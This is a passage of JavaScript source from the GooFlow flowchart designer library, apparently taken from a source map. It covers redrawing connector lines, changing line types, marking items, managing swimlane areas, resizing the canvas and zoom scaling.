if(this.$lineData[i].to===id){//找开始点\r\n\t\t\t\t\tother=this.$nodeData[this.$lineData[i].from]||null;\r\n\t\t\t\t\tif(other==null)\tcontinue;\r\n\t\t\t\t\tif(this.$lineData[i].type===\"sl\")\r\n\t\t\t\t\t\tres=calcStartEnd(other,node, this.$scale);\r\n\t\t\t\t\telse\r\n\t\t\t\t\t\tres=calcPolyPoints(other,node,this.$lineData[i].type,this.$lineData[i].M, this.$scale);\r\n\t\t\t\t\tif(!res)\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tif(other==null)\tcontinue;\r\n\t\t\t\tthis.$draw.removeChild(this.$lineDom[i]);\r\n\t\t\t\tif(this.$lineData[i].type===\"sl\"){\r\n\t\t\t\t\tthis.$lineDom[i]=GooFlow.prototype.drawLine(i,res.start,res.end,this.$lineData[i].marked,this.$lineData[i].dash, this.$scale);\r\n\t\t\t\t}\r\n\t\t\t\telse{\r\n\t\t\t\t\tthis.$lineDom[i]=GooFlow.prototype.drawPoly(i,res.start,res.m1,res.m2,res.end,this.$lineData[i].marked,this.$lineData[i].dash, this.$scale);\r\n\t\t\t\t}\r\n\t\t\t\tthis.$draw.appendChild(this.$lineDom[i]);\r\n\t\t\t\tif(GooFlow.prototype.useSVG===\"\"){\r\n\t\t\t\t\tthis.$lineDom[i].childNodes[1].innerHTML=this.$lineData[i].name;\r\n\t\t\t\t\tif(this.$lineData[i].type!==\"sl\"){\r\n\t\t\t\t\t\tvar Min=(res.start[0]>res.end[0]? res.end[0]:res.start[0]);\r\n\t\t\t\t\t\tif(Min>res.m2[0])\tMin=res.m2[0];\r\n\t\t\t\t\t\tif(Min>res.m1[0])\tMin=res.m1[0];\r\n\t\t\t\t\t\tthis.$lineDom[i].childNodes[1].style.left = (res.m2[0]+res.m1[0])/2-Min-this.$lineDom[i].childNodes[1].offsetWidth/2+4;\r\n\t\t\t\t\t\tMin=(res.start[1]>res.end[1]? res.end[1]:res.start[1]);\r\n\t\t\t\t\t\tif(Min>res.m2[1])\tMin=res.m2[1];\r\n\t\t\t\t\t\tif(Min>res.m1[1])\tMin=res.m1[1];\r\n\t\t\t\t\t\tthis.$lineDom[i].childNodes[1].style.top = (res.m2[1]+res.m1[1])/2-Min-this.$lineDom[i].childNodes[1].offsetHeight/2-4;\r\n\t\t\t\t\t}else\r\n\t\t\t\t\t\tthis.$lineDom[i].childNodes[1].style.left=\r\n\t\t\t\t\t\t\t((res.end[0]-res.start[0])*(res.end[0]>res.start[0]? 1:-1)-this.$lineDom[i].childNodes[1].offsetWidth)/2+4;\r\n\t\t\t\t}\r\n\t\t\t\telse\tthis.$lineDom[i].childNodes[2].textContent=this.$lineData[i].name;\r\n\t\t\t}\r\n\t\t},\r\n\t\t//重新设置连线的样式 newType= \"sl\":直线, \"lr\":中段可左右移动型折线, \"tb\":中段可上下移动型折线\r\n\t\tsetLineType:function(id,newType,M){\r\n\t\t\tif(!newType||newType==null||newType===\"\"||newType===this.$lineData[id].type)\treturn false;\r\n\t\t\tif(typeof this.onLineSetType==='function' && this.onLineSetType(id,newType)===false)\treturn;\r\n\t\t\tif(this.$undoStack){\r\n\t\t\t\tvar paras=[id,this.$lineData[id].type,this.$lineData[id].M];\r\n\t\t\t\tthis.pushOper(\"setLineType\",paras);\r\n\t\t\t}\r\n\t\t\tvar from=this.$lineData[id].from;\r\n\t\t\tvar to=this.$lineData[id].to;\r\n\t\t\tthis.$lineData[id].type=newType;\r\n\t\t\tvar res;\r\n\t\t\t//如果是变成折线\r\n\t\t\tif(newType!==\"sl\"){\r\n\t\t\t\t//res=calcPolyPoints(this.$nodeData[from],this.$nodeData[to],this.$lineData[id].type,this.$lineData[id].M, this.$scale);\r\n\t\t\t\tif(M){\r\n\t\t\t\t\tthis.setLineM(id,M,true);\r\n\t\t\t\t}else{\r\n\t\t\t\t\tthis.setLineM(id,getMValue(this.$nodeData[from],this.$nodeData[to],newType),true);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\t//如果是变回直线\r\n\t\t\telse{\r\n\t\t\t\tdelete this.$lineData[id].M;\r\n\t\t\t\tthis.$lineMove.hide().removeData(\"type\").removeData(\"tid\");\r\n\t\t\t\tres=calcStartEnd(this.$nodeData[from],this.$nodeData[to], this.$scale);\r\n\t\t\t\tif(!res)\treturn;\r\n\t\t\t\tthis.$draw.removeChild(this.$lineDom[id]);\r\n\t\t\t\tthis.$lineDom[id]=GooFlow.prototype.drawLine(id,res.start,res.end,this.$lineData[id].marked,this.$lineData[id].dash, this.$scale);\r\n\t\t\t\tthis.$draw.appendChild(this.$lineDom[id]);\r\n\t\t\t\tif(GooFlow.prototype.useSVG===\"\"){\r\n\t\t\t\t\tthis.$lineDom[id].childNodes[1].innerHTML=this.$lineData[id].name;\r\n\t\t\t\t\tthis.$lineDom[id].childNodes[1].style.left=\r\n\t\t\t\t\t\t((res.end[0]-res.start[0])*(res.end[0]>res.start[0]? 1:-1)-this.$lineDom[id].childNodes[1].offsetWidth)/2+4;\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t\tthis.$lineDom[id].childNodes[2].textContent=this.$lineData[id].name;\r\n\t\t\t}\r\n\t\t\tif(this.$focus===id){\r\n\t\t\t\tthis.focusItem(id);\r\n\t\t\t}\r\n\t\t\tif(this.$editable){\r\n\t\t\t\tthis.$lineData[id].alt=true;\r\n\t\t\t}\r\n\t\t},\r\n\t\t//设置折线中段的X坐标值（可左右移动时）或Y坐标值（可上下移动时）\r\n\t\tsetLineM:function(id,M,noStack){\r\n\t\t\tif(!this.$lineData[id]||M<0||!this.$lineData[id].type||this.$lineData[id].type===\"sl\")\treturn false;\r\n\t\t\tif(typeof this.onLineMove==='function' && this.onLineMove(id,M)===false)\treturn false;\r\n\t\t\tif(this.$undoStack&&!noStack){\r\n\t\t\t\tvar paras=[id,this.$lineData[id].M];\r\n\t\t\t\tthis.pushOper(\"setLineM\",paras);\r\n\t\t\t}\r\n\t\t\tvar from=this.$lineData[id].from;\r\n\t\t\tvar to=this.$lineData[id].to;\r\n\t\t\tthis.$lineData[id].M=M;\r\n\t\t\tvar ps=calcPolyPoints(this.$nodeData[from],this.$nodeData[to],this.$lineData[id].type,this.$lineData[id].M, this.$scale);\r\n\t\t\tthis.$draw.removeChild(this.$lineDom[id]);\r\n\t\t\tthis.$lineDom[id]=GooFlow.prototype.drawPoly(id,ps.start,ps.m1,ps.m2,ps.end,this.$lineData[id].marked,this.$lineData[id].dash, this.$scale);\r\n\t\t\tthis.$draw.appendChild(this.$lineDom[id]);\r\n\t\t\tif(GooFlow.prototype.useSVG===\"\"){\r\n\t\t\t\tthis.$lineDom[id].childNodes[1].innerHTML=this.$lineData[id].name;\r\n\t\t\t\tvar Min=(ps.start[0]>ps.end[0]? ps.end[0]:ps.start[0]);\r\n\t\t\t\tif(Min>ps.m2[0])\tMin=ps.m2[0];\r\n\t\t\t\tif(Min>ps.m1[0])\tMin=ps.m1[0];\r\n\t\t\t\tthis.$lineDom[id].childNodes[1].style.left = (ps.m2[0]+ps.m1[0])/2-Min-this.$lineDom[id].childNodes[1].offsetWidth/2+4;\r\n\t\t\t\tMin=(ps.start[1]>ps.end[1]? ps.end[1]:ps.start[1]);\r\n\t\t\t\tif(Min>ps.m2[1])\tMin=ps.m2[1];\r\n\t\t\t\tif(Min>ps.m1[1])\tMin=ps.m1[1];\r\n\t\t\t\tthis.$lineDom[id].childNodes[1].style.top = (ps.m2[1]+ps.m1[1])/2-Min-this.$lineDom[id].childNodes[1].offsetHeight/2-4;\r\n\t\t\t}\r\n\t\t\telse\tthis.$lineDom[id].childNodes[2].textContent=this.$lineData[id].name;\r\n\t\t\tif(this.$editable){\r\n\t\t\t\tthis.$lineData[id].alt=true;\r\n\t\t\t}\r\n\t\t},\r\n\t\t//删除转换线\r\n\t\tdelLine:function(id,trigger){\r\n\t\t\tif(!this.$lineData[id])\treturn;\r\n\t\t\tif(false!==trigger && typeof this.onItemDel==='function' && this.onItemDel(id,\"node\")===false)\treturn;\r\n\t\t\tif(this.$undoStack){\r\n\t\t\t\tvar paras=[id,this.$lineData[id]];\r\n\t\t\t\tthis.pushOper(\"addLine\",paras);\r\n\t\t\t}\r\n\t\t\tthis.$draw.removeChild(this.$lineDom[id]);\r\n\t\t\tdelete this.$lineData[id];\r\n\t\t\tdelete this.$lineDom[id];\r\n\t\t\tif(this.$focus===id)\tthis.$focus=\"\";\r\n\t\t\t--this.$lineCount;\r\n\t\t\tif(this.$editable){\r\n\t\t\t\t//在回退新增操作时,如果节点ID以this.$id+\"_line_\"开头,则表示为本次编辑时新加入的节点,这些节点的删除不用加入到$deletedItem中\r\n\t\t\t\t// if(id.indexOf(this.$id+\"_line_\")<0)\r\n\t\t\t\tthis.$deletedItem[id]=\"line\";\r\n\t\t\t\tthis.$mpFrom.hide().removeData(\"p\");\r\n\t\t\t\tthis.$mpTo.hide().removeData(\"p\");\r\n\t\t\t}\r\n\t\t\tif(this.$lineOper){\r\n\t\t\t\tthis.$lineOper.hide().removeData(\"tid\");\r\n\t\t\t}\r\n\t\t},\r\n\t\t//变更连线两个端点所连的结点\r\n\t\t//参数：要变更端点的连线ID，新的开始结点ID、新的结束结点ID；如果开始/结束结点ID是传入null或者\"\"，则表示原端点不变\r\n\t\tmoveLinePoints:function(lineId, newStart, newEnd, noStack){\r\n\t\t\tif(newStart===newEnd)\treturn;\r\n\t\t\tif(!lineId||!this.$lineData[lineId])\treturn;\r\n\t\t\tif(newStart==null||newStart===\"\")\r\n\t\t\t\tnewStart=this.$lineData[lineId].from;\r\n\t\t\tif(newEnd==null||newEnd===\"\")\r\n\t\t\t\tnewEnd=this.$lineData[lineId].to;\r\n\r\n\t\t\t//避免两个节点间不能有一条以上同向接连线\r\n\t\t\tfor(var k in this.$lineData){\r\n\t\t\t\tif((newStart===this.$lineData[k].from&&newEnd===this.$lineData[k].to))\r\n\t\t\t\t\treturn;\r\n\t\t\t}\r\n\t\t\tif(typeof this.onLinePointMove==='function' && this.onLinePointMove(lineId,newStart,newEnd)===false)\treturn;\r\n\t\t\tif(this.$undoStack&&!noStack){\r\n\t\t\t\tvar paras=[lineId,this.$lineData[lineId].from,this.$lineData[lineId].to];\r\n\t\t\t\tthis.pushOper(\"moveLinePoints\",paras);\r\n\t\t\t}\r\n\t\t\tif(newStart!=null&&newStart!==\"\"){\r\n\t\t\t\tthis.$lineData[lineId].from=newStart;\r\n\t\t\t}\r\n\t\t\tif(newEnd!=null&&newEnd!==\"\"){\r\n\t\t\t\tthis.$lineData[lineId].to=newEnd;\r\n\t\t\t}\r\n\t\t\t//重建转换线\r\n\t\t\tthis.$draw.removeChild(this.$lineDom[lineId]);\r\n\t\t\tthis.addLineDom(lineId,this.$lineData[lineId]);\r\n\t\t\tif(this.$editable){\r\n\t\t\t\tthis.$lineData[lineId].alt=true;\r\n\t\t\t}\r\n\t\t},\r\n\r\n\t\t//用颜色标注/取消标注一个结点或转换线，常用于显示重点或流程的进度。\r\n\t\t//这是一个在编辑模式中无用,但是在纯浏览模式中非常有用的方法，实际运用中可用于跟踪流程的进度。\r\n\t\tmarkItem:function(id,type,mark){\r\n\t\t\tif(type===\"node\"){\r\n\t\t\t\tif(!this.$nodeData[id])\treturn;\r\n\t\t\t\tif(typeof this.onItemMark==='function' && this.onItemMark(id,\"node\",mark)===false)\treturn;\r\n\t\t\t\tthis.$nodeData[id].marked=mark||false;\r\n\t\t\t\tif(mark){\r\n\t\t\t\t\tthis.$nodeDom[id].addClass(\"item_mark\").css(\"border-color\",GooFlow.color.mark);\r\n\t\t\t\t}\r\n\t\t\t\telse{\r\n\t\t\t\t\tthis.$nodeDom[id].removeClass(\"item_mark\");\r\n\t\t\t\t\tif(id!==this.$focus) this.$nodeDom[id].css(\"border-color\",\"transparent\");\r\n\t\t\t\t}\r\n\r\n\t\t\t}else if(type===\"line\"){\r\n\t\t\t\tif(!this.$lineData[id])\treturn;\r\n\t\t\t\tif(this.onItemMark!=null&&!this.onItemMark(id,\"line\",mark))\treturn;\r\n\t\t\t\tthis.$lineData[id].marked=mark||false;\r\n\t\t\t\tif(GooFlow.prototype.useSVG!==\"\"){\r\n\t\t\t\t\tif(mark){\r\n\t\t\t\t\t\tthis.$lineDom[id].childNodes[1].setAttribute(\"stroke\",GooFlow.color.mark);\r\n\t\t\t\t\t\tthis.$lineDom[id].childNodes[1].setAttribute(\"marker-end\",\"url(#arrow2)\");\r\n\t\t\t\t\t\tthis.$lineDom[id].childNodes[1].setAttribute(\"stroke-width\",2.4);\r\n\t\t\t\t\t}else{\r\n\t\t\t\t\t\tthis.$lineDom[id].childNodes[1].setAttribute(\"stroke\",GooFlow.color.line);\r\n\t\t\t\t\t\tthis.$lineDom[id].childNodes[1].setAttribute(\"marker-end\",\"url(#arrow1)\");\r\n\t\t\t\t\t\tthis.$lineDom[id].childNodes[1].setAttribute(\"stroke-width\",1.4);\r\n\t\t\t\t\t}\r\n\t\t\t\t}else{\r\n\t\t\t\t\tif(mark){\r\n\t\t\t\t\t\tthis.$lineDom[id].strokeColor=GooFlow.color.mark;\r\n\t\t\t\t\t\tthis.$lineDom[id].strokeWeight=\"2.4\";\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse{\r\n\t\t\t\t\t\tthis.$lineDom[id].strokeColor=GooFlow.color.line;\r\n\t\t\t\t\t\tthis.$lineDom[id].strokeWeight=\"1.2\";\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\tif(this.$undoStack){\r\n\t\t\t\tvar paras=[id,type,!mark];\r\n\t\t\t\tthis.pushOper(\"markItem\",paras);\r\n\t\t\t}\r\n\t\t},\r\n\t\t////////////////////////以下为区域分组块操作\r\n\t\t//传入一个区域组(泳道)的ID，判断图中所有结点在此区域组(泳道)的范围内\r\n\t\t_areaFixNodes:function(areaId){\r\n\t\t\tvar area=this.$areaData[areaId];\r\n\t\t\tfor(var key in this.$nodeData){\r\n\t\t\t\tvar node = this.$nodeData[key];\r\n\t\t\t\tif( node.left>=area.left&&node.left<area.left+area.width &&\r\n\t\t\t\t\tnode.top>=area.top&&node.top<area.top+area.height\r\n\t\t\t\t){\r\n\t\t\t\t\tnode.areaId=areaId;\r\n\t\t\t\t}else if(node.areaId && node.areaId===areaId){\r\n\t\t\t\t\tthis._node2Area(key);\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t},\r\n\t\tmoveArea:function(id,left,top){\r\n\t\t\tif(!this.$areaData[id])\treturn;\r\n\t\t\tif(this.onItemMove!=null&&!this.onItemMove(id,\"area\",left,top))\treturn;\r\n\t\t\tif(this.$undoStack){\r\n\t\t\t\tvar paras=[id,this.$areaData[id].left,this.$areaData[id].top];\r\n\t\t\t\tthis.pushOper(\"moveArea\",paras);\r\n\t\t\t}\r\n\t\t\tif(left<0)\tleft=0;\r\n\t\t\tif(top<0)\ttop=0;\r\n\t\t\t$(\"#\"+id).css({left:left*this.$scale+\"px\",top:top*this.$scale+\"px\"});\r\n\t\t\tthis.$areaData[id].left=left;\r\n\t\t\tthis.$areaData[id].top=top;\r\n\t\t\tif(this.$editable){\r\n\t\t\t\tthis.$areaData[id].alt=true;\r\n\t\t\t\tthis._areaFixNodes(id);\r\n\t\t\t}\r\n\t\t},\r\n\t\t//删除区域分组\r\n\t\tdelArea:function(id, trigger){\r\n\t\t\tif(!this.$areaData[id])\treturn;\r\n\t\t\tif(this.$undoStack){\r\n\t\t\t\tvar paras=[id,this.$areaData[id]];\r\n\t\t\t\tthis.pushOper(\"addArea\",paras);\r\n\t\t\t}\r\n\t\t\tif(false!==trigger && typeof this.onItemDel==='function' && this.onItemDel(id,\"node\")===false)\treturn;\r\n\t\t\tdelete this.$areaData[id];\r\n\t\t\tthis.$areaDom[id].remove();\r\n\t\t\tdelete this.$areaDom[id];\r\n\t\t\t--this.$areaCount;\r\n\t\t\tif(this.$editable){\r\n\t\t\t\t//在回退新增操作时,如果节点ID以this.$id+\"_area_\"开头,则表示为本次编辑时新加入的节点,这些节点的删除不用加入到$deletedItem中\r\n\t\t\t\t//if(id.indexOf(this.$id+\"_area_\")<0)\r\n\t\t\t\tfor(var key in this.$nodeData){\r\n\t\t\t\t\tvar node = this.$nodeData[key];\r\n\t\t\t\t\tif(node.areaId===id){\r\n\t\t\t\t\t\tdelete node.areaId\r\n\t\t\t\t\t}\r\n\t\t\t\t}\r\n\t\t\t\tthis.$deletedItem[id]=\"area\";\r\n\t\t\t}\r\n\t\t},\r\n\t\t//设置区域分组的颜色\r\n\t\tsetAreaColor:function(id,color){\r\n\t\t\tif(!this.$areaData[id])\treturn;\r\n\t\t\tif(this.$undoStack){\r\n\t\t\t\tvar paras=[id,this.$areaData[id].color];\r\n\t\t\t\tthis.pushOper(\"setAreaColor\",paras);\r\n\t\t\t}\r\n\t\t\tif(color===\"red\"||color===\"yellow\"||color===\"blue\"||color===\"green\"){\r\n\t\t\t\tthis.$areaDom[id].removeClass(\"area_\"+this.$areaData[id].color).addClass(\"area_\"+color);\r\n\t\t\t\tthis.$areaData[id].color=color;\r\n\t\t\t}\r\n\t\t\tif(this.$editable){\r\n\t\t\t\tthis.$areaData[id].alt=true;\r\n\t\t\t}\r\n\t\t},\r\n\t\t//设置区域分块的尺寸\r\n\t\tresizeArea:function(id,width,height){\r\n\t\t\tif(!this.$areaData[id])\treturn;\r\n\t\t\tif(typeof this.onItemResize==='function' && this.onItemResize(id,\"area\",width,height)===false)\treturn;\r\n\t\t\tif(this.$undoStack){\r\n\t\t\t\tvar paras=[id,this.$areaData[id].width,this.$areaData[id].height];\r\n\t\t\t\tthis.pushOper(\"resizeArea\",paras);\r\n\t\t\t}\r\n\r\n\t\t\tthis.$areaDom[id].children(\".bg\").css({width:width*this.$scale+\"px\",height:height*this.$scale+\"px\"});\r\n\r\n\t\t\twidth=this.$areaDom[id].outerWidth();\r\n\t\t\theight=this.$areaDom[id].outerHeight();\r\n\t\t\tthis.$areaDom[id].children(\"bg\").css({width:width+\"px\",height:height+\"px\"});\r\n\r\n\t\t\tthis.$areaData[id].width=width;\r\n\t\t\tthis.$areaData[id].height=height;\r\n\t\t\tif(this.$editable){\r\n\t\t\t\tthis.$areaData[id].alt=true;\r\n\t\t\t\tthis._areaFixNodes(id);\r\n\t\t\t}\r\n\t\t},\r\n\t\taddArea:function(id,json){\r\n\t\t\tif(typeof this.onItemAdd==='function' && this.onItemAdd(id,\"area\",json)===false)return;\r\n\t\t\tif(this.$undoStack&&this.$editable){\r\n\t\t\t\tthis.pushOper(\"delArea\",[id]);\r\n\t\t\t}\r\n\t\t\tthis.$areaDom[id]=$(\"<div id='\"+id+\"' class='GooFlow_area area_\"+json.color\r\n\t\t\t\t+\"' style='top:\"+json.top*this.$scale+\"px;left:\"+json.left*this.$scale+\"px'><div class='bg' style='width:\"+(json.width*this.$scale)+\"px;height:\"+(json.height*this.$scale)+\"px'></div>\"\r\n\t\t\t\t+\"<label>\"+json.name+\"</label><i></i><div><div class='rs_bottom'></div><div class='rs_right'></div><div class='rs_rb'></div><div class='rs_close'></div></div></div>\");\r\n\t\t\tthis.$areaData[id]=json;\r\n\t\t\tthis.$group.append(this.$areaDom[id]);\r\n\t\t\tif(this.$nowType!==\"group\")\tthis.$areaDom[id].children(\"div:eq(1)\").css(\"display\",\"none\");\r\n\t\t\t++this.$areaCount;\r\n\t\t\tif(this.$editable){\r\n\t\t\t\tthis.$areaData[id].alt=true;\r\n\t\t\t\tthis._areaFixNodes(id);\r\n\t\t\t\tif(this.$deletedItem[id])\tdelete this.$deletedItem[id];//在回退删除操作时,去掉该元素的删除记录\r\n\t\t\t}\r\n\t\t},\r\n\t\t//重构整个流程图设计器的宽高\r\n\t\treinitSize:function(width,height){\r\n\t\t\tvar w=(width||this.$bgDiv.width());\r\n\t\t\tvar h=(height||this.$bgDiv.height());\r\n\t\t\tthis.$bgDiv.css({height:h+\"px\",width:w+\"px\"});\r\n\t\t\tvar headHeight=0,hack=8;\r\n\t\t\tif(this.$head!=null){\r\n\t\t\t\theadHeight=26;\r\n\t\t\t\thack=5;\r\n\t\t\t}\r\n\t\t\tif(this.$tool!=null){\r\n\t\t\t\tthis.$tool.css({height:h-headHeight-hack+\"px\"});\r\n\t\t\t\tw-=31;\r\n\t\t\t}\r\n\t\t\tw-=9;\r\n\t\t\th=h-headHeight-(this.$head!=null? 5:8);\r\n\t\t\t//this.$workArea.parent().css({height:h+\"px\",width:w+\"px\"});\r\n\r\n\t\t\tif(this.$workArea.width()>w){\r\n\t\t\t\tw=this.$workArea.width();\r\n\t\t\t}\r\n\t\t\tif(this.$workArea.height()>h){\r\n\t\t\t\th=this.$workArea.height();\r\n\t\t\t}\r\n\r\n\t\t\tthis.$workArea.css({height:h+\"px\",width:w+\"px\"});\r\n\t\t\tif(GooFlow.prototype.useSVG===\"\"){\r\n\t\t\t\tthis.$draw.coordsize = w+\",\"+h;\r\n\t\t\t}\r\n\t\t\tthis.$draw.style.width = w + \"px\";\r\n\t\t\tthis.$draw.style.height = h + \"px\";\r\n\t\t\tif(this.$group!=null){\r\n\t\t\t\tthis.$group.css({height:h+\"px\",width:w+\"px\"});\r\n\t\t\t}\r\n\t\t},\r\n\t\t//重设整个工作区内容的显示缩放比例，从0.5至4倍\r\n\t\tresetScale:function(scale){\r\n\t\t\tif(!scale)\tscale=1.0;\r\n\t\t\telse if(scale<0.5)\tscale=0.5;\r\n\t\t\telse if(scale>4)\tscale=4;\r\n\t\t\t//以上是固定死取值范围：不让用户缩放过大或过小，已免无意中影响的显示效果\r\n\t\t\tif(this.$scale===scale)\treturn;\r\n\t\t\tvar oldS=this.$scale;\r\n\t\t\tthis.$scale=scale;\r\n\t\t\tvar factor = oldS/scale;//因数（旧缩放比例除以新缩放比例）,元素的现有值除以该因子，就能得到新的缩放后的值\r\n\t\t\tvar W=0,H=0,P={};//宽、高、左及上的临时变量\r\n\t\t\t//开始正式的缩放（节点、连线、泳道块有宽高和定位，其它编辑工具元素则只有定位）（全部以左上角为原点）\r\n\t\t\tthis.blurItem();\r\n\t\t\t//先缩放工作区\r\n\t\t\tW=this.$workArea.width()/factor;\r\n\t\t\tH=this.$workArea.height()/factor;\r\n\t\t\tthis.$workArea.css({\"height\":H+\"px\",\"width\":W+\"px\"});\r\n\t\t\tif(GooFlow.prototype.useSVG!==\"\"){\r\n\r\n\t\t\t}else{\r\n\t\t\t\tthis.$draw.coordsize = W+\",\"+H;\r\n\t\t\t}\r\n\t\t\tthis.$draw.style.width = W + \"px\";\r\n\t\t\tthis.$draw.style.height = H + \"px\";\r\n\t\t\tif(this.$group!=null){\r\n\t\t\t\tthis.$group.css({height:H+\"px\",width:W+\"px\"});\r\n\t\t\t}\r\n\t\t\t//缩放节点\r\n\t\t\tvar isWebkit = navigator.userAgent.toLowerCase().indexOf('webkit') > -1;\r\n\t\t\tthis.$workArea.children(\".GooFlow_item\").each(function(){\r\n\t\t\t\tvar This=$(this);\r\n\t\t\t\tP=This.position();\r\n\t\t\t\tThis.css({ \"left\":P.left/factor+\"px\", \"top\":P.top/factor+\"px\" });\r\n\t\t\t\tThis=This.children(\"table\");\r\n\t\t\t\tW=This.outerWidth()/factor;\r\n\t\t\t\tH=This.outerHeight()/factor;\r\n\t\t\t\tThis.css({ \"width\":W+\"px\", \"height\":H+\"px\" });\r\n\t\t\t\tvar tmp=18*scale;\r\n\t\t\t\tThis.find(\"td[class='ico']\").css({width:tmp+\"px\"});\r\n\t\t\t\tvar newSize= {};\r\n\t\t\t\tif(tmp<12&&isWebkit){\r\n\t\t\t\t\tnewSize[\"width\"]=\"18px\";newSize[\"height\"]=\"18px\";\r\n\t\t\t\t\tnewSize[\"font-size\"]=\"18px\";\r\n\t\t\t\t\tnewSize[\"transform\"]=\"scale(\"+(tmp/18)+\")\";\r\n\t\t\t\t\tnewSize[\"margin\"]=-((18-tmp)/2)+\"px\";\r\n\t\t\t\t}else{\r\n\t\t\t\t\tnewSize[\"width\"]=tmp+\"px\"; newSize[\"height\"]=tmp+\"px\";\r\n\t\t\t\t\tnewSize[\"font-size\"]=tmp+\"px\";\r\n\t\t\t\t\tnewSize[\"transform\"]=\"none\";\r\n\t\t\t\t\tnewSize[\"margin\"]=\"0px auto\";\r\n\t\t\t\t}\r\n\t\t\t\tThis.find(\"td[class='ico']\").children(\"i\").css(newSize);\r\n\r\n\t\t\t\ttmp=14*scale;\r\n\t\t\t\tif(This.parent().find(\".span\").length===1){\r\n\t\t\t\t\tThis.parent().css(\"border-radius\",W/2+\"px\");\r\n\t\t\t\t\tThis=This.parent().find(\".span\");\r\n\t\t\t\t\tThis.css({\"font-size\":tmp+\"px\"});\r\n\t\t\t\t}else{\r\n\t\t\t\t\tThis=This.find(\"td:eq(1) div\");\r\n\t\t\t\t\tnewSize={};\r\n\t\t\t\t\tif(tmp<12&&isWebkit){\r\n\t\t\t\t\t\tnewSize[\"font-size\"]=\"14px\";\r\n\t\t\t\t\t\tnewSize[\"transform\"]=\"scale(\"+(tmp/14)+\")\";\r\n\t\t\t\t\t\tvar mW=(W/scale-18-(W-18*scale))/2;\r\n\t\t\t\t\t\tvar mH=(H/scale-H)/2;\r\n\t\t\t\t\t\tnewSize[\"margin\"]=-mH+\"px \"+(-mW)+\"px\";\r\n\t\t\t\t\t}else{\r\n\t\t\t\t\t\tnewSize[\"transform\"]=\"none\";\r\n\t\t\t\t\t\tnewSize[\"font-size\"]=tmp+\"px\";\r\n\t\t\t\t\t\tnewSize[\"margin\"]=\"0px\";\r\n\t\t\t\t\t}\r\n\t\t\t\t\tThis.css(newSize);\r\n\t\t\t\t}\r\n\t\t\t});\r\n\t\t\t//缩放区域图\r\n\t\t\tvar ifs=16*scale+2;\r\n\t\t\tthis.$group.children(\".GooFlow_area\").each(function(){\r\n\t\t\t\tvar This=$(this);\r\n\t\t\t\tP=This.position();\r\n\t\t\t\tThis.css({ \"left\":P.left/factor+\"px\", \"top\":P.top/factor+\"px\" });\r\n\t\t\t\tThis=This.children(\"div:eq(0)\");\r\n\t\t\t\tW=This.outerWidth()/factor;\r\n\t\t\t\tH=This.outerHeight()/factor;\r\n\t\t\t\tThis.css({ \"width\":W+\"px\", \"height\":H+\"px\" });\r\n\t\t\t\tThis.next(\"label\").css({\r\n\t\t\t\t\t\"font-size\": 14*scale+\"px\",\r\n\t\t\t\t\t\"left\": ifs+3+\"px\"\r\n\t\t\t\t}).next(\"i\").css({\r\n\t\t\t\t\t\"font-size\": ifs-2+\"px\",\r\n\t\t\t\t\twidth:ifs+\"px\",\r\n\t\t\t\t\theight:ifs+\"px\",\r\n\t\t\t\t\t\"line-height\":ifs+\"px\"\r\n\t\t\t\t});\r\n\t\t\t});\r\n\t\t\t//缩放连线\r\n\t\t\tfor(var id in this.$lineDom){\r\n\t\t\t\tthis.$draw.removeChild(this.$lineDom[id]);\r\n\t\t\t\tdelete this.$lineDom[id];\r\n\t\t\t}\r\n\t\t\tfor (var key in this.$lineData) {\r\n\t\t\t\tthis.addLineDom(key, this.$lineData[key]);\r\n\t\t\t}\r\n\t\t}\r\n\t};\r\n//默认的颜色样式\r\n\tGooFlow.color={\r\n\t\t//main:\"#20A0FF\",\r\n\t\tfont:\"#15428B\",\r\n\t\tnode:\"#C0CCDA\",\r\n\t\tline:\"#1D8CE0\",\r\n\t\tlineFont:\"#777\",\r\n\t\tmark:\"#ff8800\",\r\n\t\tmix:\"#B6F700\",\r\n\t\tmixFont:\"#777\"\r\n\t};\r\n\t//默认的文字说明注释内容\r\n\tGooFlow.remarks={\r\n\t\theadBtns:{},\r\n\t\ttoolBtns:{},\r\n\t\textendRight:undefined,\r\n\t\textendBottom:undefined\r\n\t};\r\n//当不想使用jquery插件式初始化方法时，另一种通过直接调用GooFlow内部构造方法进行的初始化\r\n\tGooFlow.init=function(selector,property){\r\n\t\treturn new GooFlow(selector,property);\r\n\t};\r\n//在初始化出一个对象前的公用方法：覆盖设定GooFlow默认的颜色定义\r\n\tGooFlow.setColors=function(colors){\r\n\t\t$.extend(GooFlow.color,colors);\r\n\t};\r\n//扩展GooFlow方法的扩展用接口，一般用在CMD,AMD\r\n\tGooFlow.extend=function(json){\r\n\t\tfor(var funcName in json){\r\n\t\t\tGooFlow.prototype[funcName]=json[funcName];\r\n\t\t}\r\n\t};\r\n//将此类的构造函数加入至JQUERY对象中\r\n\t$.extend({\r\n\t\tcreateGooFlow:function(selector,property){\r\n\t\t\treturn new GooFlow(selector,property);\r\n\t\t}\r\n\t});\r\n\treturn GooFlow;\r\n\r\n}));"]}